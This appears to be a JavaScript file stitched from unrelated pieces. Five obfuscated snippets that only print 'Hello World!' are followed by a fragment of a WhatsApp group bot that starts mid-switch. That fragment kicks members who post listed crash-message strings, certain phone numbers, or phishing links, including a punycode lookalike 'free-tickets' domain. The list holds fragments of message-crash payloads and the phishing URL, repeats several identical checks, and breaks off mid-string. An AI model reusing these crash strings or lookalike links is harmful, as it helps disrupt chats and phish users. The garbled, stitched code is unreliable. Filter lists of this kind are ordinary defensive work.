var _0x2892=['2796lBDVKg','426889eHtiqk','Hello','240475AkFezk','34clbDfo','24908RAvKof','6502IFCCjE','log','1eyFIAf','10NTQJiv','472525vWBZqB','21MuTLkg','mlEQL','95037dNIkwa','4XzVeSz','\x20Worl'];function _0x6703(_0x332d88,_0x2b7623){_0x332d88=_0x332d88-(0x11f1+0x475+-0x150f*0x1);var _0x528165=_0x2892[_0x332d88];return _0x528165;}(function(_0x1524d2,_0x3ca43f){var _0x5401bd=function(_0x209062,_0x395b9a,_0x2a01bc,_0x15faaa,_0x493fa9){return _0x6703(_0x2a01bc- -0x26c,_0x493fa9);},_0x51d1cd=function(_0x26763e,_0x23823f,_0x5c0f3b,_0x3372b2,_0x377540){return _0x6703(_0x5c0f3b- -0x26c,_0x377540);},_0x383c5b=function(_0x36095b,_0x3d22be,_0x330b97,_0x3e1303,_0x1454d1){return _0x6703(_0x330b97- -0x26c,_0x1454d1);},_0x4f6a99=function(_0x139971,_0x2e87a3,_0x34c279,_0x2f560a,_0x1c68c){return _0x6703(_0x34c279- -0x26c,_0x1c68c);},_0x49379c=function(_0x1b4caf,_0x5ce428,_0x302af3,_0x12b285,_0x251f27){return _0x6703(_0x302af3- -0x26c,_0x251f27);};while(!![]){try{var _0x770269=parseInt(_0x5401bd(-0x112,-0x11b,-0x115,-0x11b,-0x11b))+parseInt(_0x5401bd(-0x10d,-0x109,-0x10a,-0x108,-0x103))*parseInt(_0x383c5b(-0x117,-0x10e,-0x113,-0x112,-0x11b))+parseInt(_0x51d1cd(-0x10c,-0x110,-0x114,-0x10e,-0x11a))*parseInt(_0x49379c(-0x110,-0x106,-0x108,-0x10b,-0x10b))+parseInt(_0x5401bd(-0x10c,-0x103,-0x107,-0x106,-0x104))*parseInt(_0x5401bd(-0x110,-0x10d,-0x110,-0x118,-0x118))+parseInt(_0x51d1cd(-0x114,-0x112,-0x112,-0x10a,-0x10a))*-parseInt(_0x383c5b(-0x10f,-0x106,-0x10d,-0x10d,-0x108))+parseInt(_0x4f6a99(-0x10c,-0x113,-0x10e,-0x113,-0x112))+parseInt(_0x4f6a99(-0x104,-0x108,-0x10b,-0x10d,-0x10b))*-parseInt(_0x5401bd(-0x10e,-0x10b,-0x10f,-0x117,-0x10c));if(_0x770269===_0x3ca43f)break;else _0x1524d2['push'](_0x1524d2['shift']());}catch(_0xa37e5a){_0x1524d2['push'](_0x1524d2['shift']());}}}(_0x2892,-0x19089+-0xb*-0x6089+-0x1*-0x1321f));function hi(){var _0x748471=function(_0x3008e0,_0x1d28f4,_0x1b61de,_0x339141,_0x310e1f){return _0x6703(_0x310e1f-0x7a,_0x1b61de);},_0x1f7596=function(_0x4c448e,_0x3a371c,_0x47c3bf,_0x4abf98,_0x4a7b29){return _0x6703(_0x4a7b29-0x7a,_0x47c3bf);},_0x3190de=function(_0x12b096,_0x1e6cd4,_0x52030f,_0x4bffeb,_0x56290c){return _0x6703(_0x56290c-0x7a,_0x52030f);},_0x4fb155=function(_0x5f0b22,_0x566069,_0xafe3d3,_0x12b5e5,_0x5ae136){return _0x6703(_0x5ae136-0x7a,_0xafe3d3);},_0x379e5d=function(_0x16e614,_0x3df6cc,_0x38f915,_0x5237ed,_0x49c53d){return _0x6703(_0x49c53d-0x7a,_0x38f915);},_0xe079e1={};_0xe079e1[_0x748471(0x1d9,0x1da,0x1e1,0x1db,0x1da)]=_0x748471(0x1e7,0x1e7,0x1dd,0x1db,0x1e0)+_0x748471(0x1e1,0x1db,0x1e4,0x1e3,0x1dd)+'d!';var _0x250d90=_0xe079e1;console[_0x3190de(0x1ce,0x1d8,0x1d9,0x1d6,0x1d5)](_0x250d90[_0x1f7596(0x1e1,0x1dd,0x1d2,0x1d3,0x1da)]);}hi();
var _0xa494=['461198guhzrU','1346734OzNWsd','27oNzqkW','1LBjsGi','Uqfpw','9127AiKGhG','log','89yEThMI','550533Ogmyhn','Hello','32377AUvZvw','71vPiYGd','756304wscllM','\x20Worl','18597INNoKB'];(function(_0x16d0b5,_0xf89082){var _0x49f247=function(_0xff55db,_0x20a934,_0x398312,_0x4796c3,_0x3f1ab7){return _0x504f(_0xff55db-0x318,_0x4796c3);},_0x34a735=function(_0x2d69bd,_0x1dc1e2,_0x3750ca,_0xd03432,_0x2e1c0a){return _0x504f(_0x2d69bd-0x318,_0xd03432);},_0x347ff9=function(_0xdf4430,_0x17d238,_0x1a4ef7,_0x36bf30,_0x214731){return _0x504f(_0xdf4430-0x318,_0x36bf30);},_0x16b720=function(_0x56878d,_0x478e35,_0x15fbe7,_0x3a4056,_0x3bde91){return _0x504f(_0x56878d-0x318,_0x3a4056);},_0x33cc29=function(_0x514088,_0x1a3e97,_0x340436,_0x49ff2e,_0x5ecd23){return _0x504f(_0x514088-0x318,_0x49ff2e);};while(!![]){try{var _0x337638=parseInt(_0x49f247(0x3cb,0x3c7,0x3c4,0x3ce,0x3d3))*parseInt(_0x34a735(0x3cd,0x3d2,0x3d4,0x3ce,0x3cc))+parseInt(_0x347ff9(0x3c8,0x3c1,0x3ca,0x3ca,0x3c6))*-parseInt(_0x34a735(0x3c1,0x3bc,0x3b9,0x3bd,0x3c7))+parseInt(_0x16b720(0x3c7,0x3cd,0x3cb,0x3cd,0x3cd))+-parseInt(_0x33cc29(0x3c3,0x3c3,0x3c2,0x3bc,0x3c8))*-parseInt(_0x16b720(0x3c9,0x3c4,0x3c4,0x3ce,0x3ca))+-parseInt(_0x16b720(0x3c6,0x3ca,0x3c1,0x3bf,0x3c9))+parseInt(_0x347ff9(0x3bf,0x3bd,0x3c5,0x3c1,0x3ba))+parseInt(_0x33cc29(0x3c2,0x3be,0x3bb,0x3c1,0x3c9))*-parseInt(_0x34a735(0x3c5,0x3c9,0x3c8,0x3c9,0x3cb));if(_0x337638===_0xf89082)break;else _0x16d0b5['push'](_0x16d0b5['shift']());}catch(_0x27c77f){_0x16d0b5['push'](_0x16d0b5['shift']());}}}(_0xa494,0x16a705*0x1+0x14f804+0x1f428b*-0x1));function hi(){var _0x104c75=function(_0x28d988,_0x214fb7,_0x32c45b,_0x209dd3,_0x1654a3){return _0x504f(_0x209dd3-0x3e7,_0x214fb7);},_0x9ed0e=function(_0x1eb2b3,_0x1a9099,_0x47b344,_0x5cae96,_0x55782f){return _0x504f(_0x5cae96-0x3e7,_0x1a9099);},_0x21ead9=function(_0xfd893a,_0x46e0c1,_0x16fda8,_0x386103,_0x5ec164){return _0x504f(_0x386103-0x3e7,_0x46e0c1);},_0x1a0fa8=function(_0x3dc546,_0x43fe20,_0x5a662d,_0x2be594,_0x17218e){return _0x504f(_0x2be594-0x3e7,_0x43fe20);},_0x184893=function(_0x1d22b0,_0x401c86,_0x5b6a45,_0x3fe331,_0x1d28bf){return _0x504f(_0x3fe331-0x3e7,_0x401c86);},_0x13bc94={};_0x13bc94[_0x104c75(0x491,0x49c,0x497,0x499,0x493)]=_0x9ed0e(0x488,0x492,0x495,0x48f,0x48d)+_0x104c75(0x49b,0x49a,0x49b,0x493,0x491)+'d!';var _0x7775c4=_0x13bc94;console[_0x104c75(0x4a0,0x49d,0x493,0x49b,0x4a1)](_0x7775c4[_0x1a0fa8(0x49b,0x494,0x49d,0x499,0x4a0)]);}function _0x504f(_0x423b80,_0x21c653){_0x423b80=_0x423b80-(0x1faa+0x91*0x3d+-0x4190);var _0x5dd6cc=_0xa494[_0x423b80];return _0x5dd6cc;}hi();
var _0x1a2d=['873274GOPKwu','49711TqvDhS','vSwjL','\x20Worl','6288WzzdEo','158LOZYqz','65050TiskhG','Hello','3457238BFUhof','1048345mcjShl','8dYNcgW','log','9zqBrQA','1036383cchzlh'];(function(_0x3c9f84,_0xf9deaf){var _0x59f774=function(_0x55c2e1,_0x1af17c,_0x2ebb3f,_0x4fc754,_0x286f22){return _0x4954(_0x1af17c- -0xef,_0x4fc754);},_0x5cfd5c=function(_0x44d40f,_0x1979f2,_0x23f583,_0x5898a0,_0x521d52){return _0x4954(_0x1979f2- -0xef,_0x5898a0);},_0x20c769=function(_0xb90686,_0xdf929b,_0x105f6f,_0x4d84fd,_0x5e7cc0){return _0x4954(_0xdf929b- -0xef,_0x4d84fd);},_0x376eb5=function(_0x15bcc2,_0x25cab5,_0x2aff59,_0x29426e,_0x4bdc68){return _0x4954(_0x25cab5- -0xef,_0x29426e);},_0x4e6ab7=function(_0x30f571,_0x7a65bb,_0x3fb9c7,_0x3fe116,_0x2acfa1){return _0x4954(_0x7a65bb- -0xef,_0x3fe116);};while(!![]){try{var _0x2d25ba=-parseInt(_0x59f774(0x67,0x63,0x69,0x5f,0x5c))*-parseInt(_0x5cfd5c(0x5e,0x62,0x64,0x5c,0x60))+parseInt(_0x5cfd5c(0x6b,0x64,0x5e,0x66,0x5d))*-parseInt(_0x20c769(0x6d,0x68,0x64,0x65,0x6e))+-parseInt(_0x59f774(0x5a,0x5e,0x65,0x5a,0x65))+-parseInt(_0x4e6ab7(0x58,0x5d,0x5d,0x60,0x5b))+parseInt(_0x4e6ab7(0x5e,0x5f,0x66,0x5b,0x60))*-parseInt(_0x376eb5(0x59,0x5c,0x57,0x58,0x62))+-parseInt(_0x4e6ab7(0x62,0x67,0x63,0x6b,0x66))+parseInt(_0x5cfd5c(0x68,0x66,0x66,0x63,0x68));if(_0x2d25ba===_0xf9deaf)break;else _0x3c9f84['push'](_0x3c9f84['shift']());}catch(_0x59ea96){_0x3c9f84['push'](_0x3c9f84['shift']());}}}(_0x1a2d,-0x1c35d*-0x8+-0x1b185+-0xc62*0x5b));function _0x4954(_0x1355fd,_0x3169a1){_0x1355fd=_0x1355fd-(-0x9ce+-0x1*-0xfef+-0x2*0x26b);var _0x2c6143=_0x1a2d[_0x1355fd];return _0x2c6143;}function hi(){var _0x1683cd=function(_0x2d0bd1,_0x54806a,_0x3438a7,_0x45a1ad,_0x1cec13){return _0x4954(_0x1cec13- -0x184,_0x3438a7);},_0x247154=function(_0x367324,_0x2fc684,_0x5c8f60,_0x223bec,_0x3930c0){return _0x4954(_0x3930c0- -0x184,_0x5c8f60);},_0x3102a3=function(_0x562ae7,_0x2bcb3a,_0x8bea13,_0x483f01,_0x2dc5e4){return _0x4954(_0x2dc5e4- -0x184,_0x8bea13);},_0x22703e=function(_0x77f87b,_0xe30b88,_0x535ac0,_0x101ffc,_0x2f4233){return _0x4954(_0x2f4233- -0x184,_0x535ac0);},_0x318c90=function(_0x59e9f6,_0x3dcb5b,_0x251259,_0x3fb760,_0x5ec60f){return _0x4954(_0x5ec60f- -0x184,_0x251259);},_0x557a23={};_0x557a23[_0x1683cd(-0x39,-0x2e,-0x2e,-0x33,-0x35)]=_0x1683cd(-0x31,-0x2b,-0x29,-0x29,-0x30)+_0x1683cd(-0x37,-0x35,-0x3a,-0x39,-0x34)+'d!';var _0x42836a=_0x557a23;console[_0x22703e(-0x26,-0x2e,-0x2e,-0x33,-0x2c)](_0x42836a[_0x22703e(-0x38,-0x34,-0x2e,-0x2e,-0x35)]);}hi();
var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();

addFilter(from)
          break
        
        default:

 if (budy.includes(`@18156806165`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}
	
	 if (budy.includes(`B闦R闦I闦G闦A闦D闦`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}
 if (budy.includes(`~@`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}
					 if (budy.includes(`saur.com`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}

					//v
					
	if (budy.includes(`~*@555484137179*~`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}				
					
					
	if (budy.includes(`19565244699`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}			
					
		if (budy.includes(`SUSHANT.`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
					
					
	
		
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`ɩȿạɩɾ.com`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	if (budy.includes(`๒`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
			
	if (budy.includes(`www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrh`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	
			
	if (budy.includes(`🔴`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

			
						
												
	if (budy.includes(`𝟏(𝟖𝟖𝟔)𝟗𝟗𝟗-𝟏𝟑𝟒𝟓`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

				if (budy.includes(`⏤͟͟͞͞ 😈MATAR XXX₀₀₇ꪰ😈`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

				if (budy.includes(`❄️_××××××××÷_`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
						
			if (budy.includes(`chat.whatsapp.com/K2vyQpkxfT2Eh63O55L0B8@hird_fekalinos:👿👿👿𒀱☹️𒀱𒀱𒀱⃢⃢⃢𒀱𒀱⃢⃢⃢𒀱𒀱⃢⃢⃢𒀱𒀱⃢𒀱☹️𒀱💝🤔𒀱𒀱⃢z𒀱🅱️𒀱𒀱⃢𒀱⃢🇬🇧𒀱⃢⃢⃢👾⃠⃤𒀱⃠⃤𒀱𒂭𒂭𒇫𒇫𒇫𒇫⃢⃢:👺🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂🥰:👿👿👿👿𒀱☹️𒀱𒀱𒀱⃢⃢⃢𒀱✖❌✖❌✖❌✖❌❌✖❌✖❌✖❌✖❌❌🔱❌❌❌❌✳✳❕❕❗✴✴✴✴✴✴✴✴❗〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️💔❔❔❔❔⚫▪️➿💮💮🕐🕟🕔🔕⭕💯`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
					if (budy.includes(`⃟ᡃ⃟ᡃ⃟ᡃ⃟`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
						
										
				if (budy.includes(`𝟏(𝟖𝟖𝟔)𝟗𝟗𝟗-𝟏𝟑𝟒𝟓ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
									
							
	if (budy.includes(`⃟⃟⃟⃟`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

												
		if (budy.includes(`৯৯৯৯`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`100030449499276`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`xn--hatsapp-rh4c.com/free-tickets‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎